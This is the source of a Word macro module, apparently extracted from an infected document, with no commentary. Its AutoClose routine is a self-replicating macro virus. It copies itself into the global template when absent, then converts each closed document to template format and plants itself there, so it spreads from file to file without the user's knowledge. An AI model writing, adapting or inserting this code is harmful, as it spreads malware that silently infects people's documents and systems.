   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
       install
   End Sub

   Private Sub install()
   Dim total
   Dim installed
   Dim i
       total = WordBasic.CountMacros(0)
       installed = 0
       If total > 0 Then
           For i = 1 To total
               If WordBasic.[MacroName$](i, 0) = "AutoClose" Then
                   installed = 1
               End If
           Next
       End If
       If installed = 0 Then
           WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
       Else
           total = WordBasic.CountMacros(1)
           installed = 0
           If total > 0 Then
               For i = 1 To total
                   If WordBasic.[MacroName$](i, 1) = "AutoClose" Then
                       installed = 1
                   End If
               Next
           End If
           If installed = 0 Then
               WordBasic.FileSaveAs Format:=1
               WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
           End If
       End If
   End Sub
